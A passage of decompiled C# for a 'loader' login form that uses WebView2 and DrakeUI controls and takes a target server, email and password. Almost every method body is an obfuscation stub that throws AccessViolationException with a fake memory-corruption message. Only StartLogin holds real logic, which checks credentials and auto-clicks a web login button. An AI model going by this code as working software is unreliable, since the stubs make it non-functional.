
	[field: AccessedThroughProperty("DrakeWidth_W6")]
	internal virtual DrakeWidth_W DrakeWidth_W6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual WebView2 mywebview
	{
		[CompilerGenerated]
		get
		{
			return _mywebview;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler<CoreWebView2NavigationCompletedEventArgs> value2 = mywebview_NavigationCompleted;
			WebView2 webView = _mywebview;
			if (webView != null)
			{
				webView.NavigationCompleted -= value2;
			}
			_mywebview = value;
			webView = _mywebview;
			if (webView != null)
			{
				webView.NavigationCompleted += value2;
			}
		}
	}

	[field: AccessedThroughProperty("loadwbv")]
	internal virtual WebView2 loadwbv
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("loadpanel")]
	internal virtual Panel loadpanel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel1")]
	internal virtual Panel Panel1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public virtual DrakeUIButtonIcon closbtn
	{
		[CompilerGenerated]
		get
		{
			return _closbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = closbtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _closbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_closbtn = value;
			drakeUIButtonIcon = _closbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[System.Runtime.CompilerServices.MethodImpl(System.Runtime.CompilerServices.MethodImplOptions.NoInlining)]
	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		throw new System.AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public loader(string Trgt_Server, string Trgt_email, string Trgt_pass, ServersInfo Srvinf)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	[AsyncStateMachine(typeof(VB_0024StateMachine_57_loader_Load))]
	[DebuggerStepThrough]
	private void loader_Load(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	[AsyncStateMachine(typeof(VB_0024StateMachine_58_loadingtime_Tick))]
	[DebuggerStepThrough]
	private void loadingtime_Tick(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Success(string message)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void infos(string message)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void errors(string message)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Errorlogin()
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void hideloader()
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void showloader()
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void pinerady()
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void checkremember_MouseClick(object sender, MouseEventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	private void StartLogin()
	{
		string text = ServersMgr.GetServerPin(TargetServer);
		if ((text == null) | codes.StrisEmpty(text))
		{
			text = EmptKey;
		}
		if (codes.StrisEmpty(Targetemail) | codes.StrisEmpty(TargetPass) | codes.StrisEmpty(text))
		{
			BTAlerter.Warnings(BTConst.enter_eml_pass);
		}
		else if (Operators.CompareString(text, EmptKey, TextCompare: false) != 0)
		{
			Thread thread = new Thread([SpecialName] () =>
			{
				Setp1_Trylogin(text);
			});
			thread.IsBackground = true;
			thread.Start();
		}
		else
		{
			Invoke((VB_0024AnonymousDelegate_0)([SpecialName] async () =>
			{
				await mywebview.ExecuteScriptAsync("document.getElementById('login-button').click();");
				Autologin();
			}));
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void Panel2_MouseDown(object sender, MouseEventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public bool IsValidIPv4(string address)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void DrakeUIButtonIcon6_Click_1(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public bool IsValidKey(string key)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void keychecker_DoWork(object sender, DoWorkEventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Autologin()
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	[AsyncStateMachine(typeof(VB_0024StateMachine_76_mywebview_NavigationCompleted))]
	[DebuggerStepThrough]
	private void mywebview_NavigationCompleted(object sender, CoreWebView2NavigationCompletedEventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void DrakeUIButtonIcon7_Click_1(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	[AsyncStateMachine(typeof(VB_0024StateMachine_78_Setp1_Trylogin))]
	[DebuggerStepThrough]
	public void Setp1_Trylogin(string pinkey)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	[AsyncStateMachine(typeof(VB_0024StateMachine_79_Step2_join))]
	[DebuggerStepThrough]
	public void Step2_join()
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void closbtn_Click(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}
}
